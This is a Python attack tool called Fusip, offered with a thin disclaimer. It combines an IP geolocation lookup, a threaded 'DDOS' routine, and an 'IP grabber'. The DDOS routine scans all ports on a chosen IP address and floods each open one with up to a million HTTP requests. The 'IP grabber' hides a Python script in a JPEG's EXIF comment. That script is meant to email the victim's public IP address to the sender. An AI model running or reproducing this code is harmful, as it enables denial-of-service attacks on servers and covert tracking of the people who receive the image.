import pyfiglet
import time
import piexif
from PIL import Image, ImageDraw
import requests
import socket
import threading
from queue import Queue
import smtplib
from email.mime.text import MIMEText
import sys
import ipaddress

# Welcome developers to my first project: Fusip.
# I hope this will assist you in your testing.
# Unauthorized use for malicious purposes is strictly prohibited; I hold no responsibility for such actions.
# Here is my GitHub repository: https://github.com/Gekiidoo .
# Here is my discord : https://discord.gg/SrJgUTQcAH .


# Function to check if the API key is valid
def check_api_key(api_key):
    if api_key == "import your api key here":
        print("\033[91mPlease input your API key.\033[0m")
        return False
    return True

# Import your API key (to unlock the IP analysis for free: https://ipinfo.io)
API_KEY = "import your api key here"


# Function to display loading progress for IP analysis
def loading1():
    print("\033[91mIP analysis in progress...\033[0m")
    for i in range(1, 101):
        sys.stdout.write("\033[91m%s%%\033[0m" % i + "\033[91m" + "..." + "\033[0m" + "\r")
        sys.stdout.flush()
        time.sleep(0.01)

# Function to display loading progress for image generation
def loading2():
    print("\033[92mImage generation in progress...\033[0m")
    for i in range(1, 101):
        sys.stdout.write("\033[92m%s%%\033[0m" % i + "\033[92m" + "..." + "\033[0m" + "\r")
        sys.stdout.flush()
        time.sleep(0.01)

# Function to perform IP scan
def ipscan():
    # Check if API key is valid
    if not check_api_key(API_KEY):
       sys.exit()

    ip_address = input("\033[93mWhat is the IP address to analyze? :\033[0m ").strip()

    # Validate IPv4 format
    try:
        ipaddress.IPv4Address(ip_address)
    except ipaddress.AddressValueError:
        print("\033[93mError: Invalid IPv4 address format\033[0m")
        time.sleep(3)
        return

    if not ip_address:
        print("\033[93mError: you must enter an IP\033[0m")
        time.sleep(3)
        return

    loading1()

    url = f"https://ipinfo.io/{ip_address}/json?token={API_KEY}"
    response = requests.get(url)

    if response.status_code == 200:
        data = response.json()
        print("\n")
        print("\033[93mIP address information:\033[0m")
        print("\n")
        print("\033[93mIP :\033[0m", data.get('ip'))
        print("\033[93mCountry :\033[0m", data.get('country'))
        print("\033[93mCity :\033[0m", data.get('city'))
        loc = data.get('loc')
        time.sleep(3)
        if loc is not None:
            print("\033[93mLatitude :\033[0m", loc.split(',')[0])
            print("\033[93mLongitude :\033[0m", loc.split(',')[1])
            time.sleep(3)
        else:
            print("\033[93mLatitude and longitude information not available for this IP address.\033[0m")
        print("\033[93mInternet Service Provider (ISP) :\033[0m", data.get('org'))
        time.sleep(3)
    else:
        print("\033[93mError retrieving information for the IP address.\033[0m")
        time.sleep(3)

# Function to perform IP grabber
def ipgrabber():
    loading2()
    image = Image.new("RGB", (1, 1), (255, 255, 255))
    draw = ImageDraw.Draw(image)

    draw.point((0, 0), fill=(255, 255, 255))

    image_with_metadata = "ipgrabber_image_with_metadata.jpg"
    image.save(image_with_metadata)
    
    # Function to send mail
    def send_email(ip_address):
        sender_email = "your_email@example.com"
        receiver_email = "recipient@example.com"
        password = "your_email_password"

        message = MIMEText(f"IP Address: {ip_address}")
        message['Subject'] = 'IP Address Information'
        message['From'] = sender_email
        message['To'] = receiver_email

        try:
            server = smtplib.SMTP_SSL('smtp.example.com', 465)
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            print("\033[92mEmail sent successfully\033[0m")
            server.quit()
        except Exception as e:
            print("\033[92mError sending email:", str(e), "\033[0m")

    def get_public_ip():
        try:
            response = requests.get('https://api.ipify.org')
            return response.text
        except Exception as e:
            print("\033[92mError getting public IP:", str(e), "\033[0m")
            return None
   
    ip_address = get_public_ip()
    if ip_address:
        send_email(ip_address)
    else:
        print("\033[92mUnable to retrieve public IP address\033[0m")

    script_content = f"""
import requests
import smtplib
from email.mime.text import MIMEText

def send_email(ip_address):
    sender_email = "your_email@example.com"
    receiver_email = "recipient@example.com"
    password = "your_email_password"

    message = MIMEText(f"IP Address: {ip_address}")
    message['Subject'] = 'IP Address Information'
    message['From'] = sender_email
    message['To'] = receiver_email

    try:
        server = smtplib.SMTP_SSL('smtp.example.com', 465)
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())
        print("\033[92mEmail sent successfully\033[0m")
        server.quit()
    except Exception as e:
        print("\033[92mError sending email:", str(e), "\033[0m")

ip_address = requests.get('https://api.ipify.org').text
send_email(ip_address)
"""

    exif_dict = {"Exif": {piexif.ExifIFD.UserComment: script_content.encode("utf-8")}}
    exif_bytes = piexif.dump(exif_dict)
    piexif.insert(exif_bytes, image_with_metadata)

    print("\n")
    print("\033[92mImage generated successfully.\033[0m")
    time.sleep(1)
    print("\033[92mMake sure to rename the image.\033[0m")
    time.sleep(5)

# Function to perform DDOS attack
def ddos_attack(ip_address, queue, max_attempts=3):
    open_ports = []
    
    # Analyze open ports
    for port in range(1, 65536):  # Range of possible port numbers
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.1)  # Set a timeout for connection attempt
        result = sock.connect_ex((ip_address, port))  # Check if the port is open
        if result == 0:  # If connection successful, port is open
            open_ports.append(port)
        sock.close()
    
    print(f"\033[94mOpen ports on {ip_address}: {open_ports}\033[0m")
    
    if not open_ports:
        print("\033[94mNo open ports found. Exiting DDOS attack.\033[0m")
        return
    
    # Launch DDOS attack on all open ports
    for port in open_ports:
        attempts = 0
        connected = False
        while attempts < max_attempts:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((ip_address, port))
                # Send millions of requests
                for _ in range(1000000):
                    request = b"GET / HTTP/1.1\r\nHost: " + ip_address.encode() + b"\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n\r\n"
                    s.send(request)
                print(f"\033[94mMillions of requests sent to {ip_address}:{port}\033[0m")
                connected = True
                break
            except Exception as e:
                print(f"\033[94mError in connection: {e}\033[0m")
                time.sleep(5)
                attempts += 1
            finally:
                s.close()
        if connected:
            print(f"\033[94mConnected to {ip_address}:{port}\033[0m")
        queue.task_done()

# Function to initiate DDOS attack
def ipddos():
    print("\n")
    print("\033[94mThe DDOS IP functionality is being executed.\033[0m")
    ip_address = input("\033[94mEnter the IP address to attack: \033[0m").strip()
    if not ip_address:
        print("\033[94mError: you must enter an IP\033[0m")
        time.sleep(3)
        return ipddos()
    num_connections = int(input("\033[94mEnter the number of connections to establish: \033[0m"))

    queue = Queue()
    for _ in range(num_connections):
        t = threading.Thread(target=ddos_attack, args=(ip_address, queue))
        t.daemon = True
        t.start()

    for _ in range(num_connections):
        queue.put(None)

    queue.join()

    print("\n")
    print("\033[94mDDOS attack completed.\033[0m")

# Displaying the ASCII art
text = "FUSIP"
ascii_art = pyfiglet.figlet_format(text, font="big")
print("\033[95m" + ascii_art + "\033[0m")

# Main loop
while True:
    print("1 : IP scan (IPv4 only)")
    print("2 : IP DDOS")
    print("3 : IP grabber")
    print("4 : Quit")

    x = int(input("Choose between 1, 2, 3 or 4 : "))

    if x == 1:
        ipscan()
        print("\n")
    elif x == 2:
        ipddos()
        print("\n")
    elif x == 3:
        ipgrabber()
        print("\n")
    elif x == 4:
        break
    else:
        print("\033[95mInvalid choice, please try again.\033[0m")
        time.sleep(3)
        print("\n" * 2)

# Note: DDOS attack only works on unsecure servers
# Nowadays servers are too secure to be taken down by a DDOS attack.
# Similarly, IP grabber with an image is not very effective as most platforms strip metadata from images.
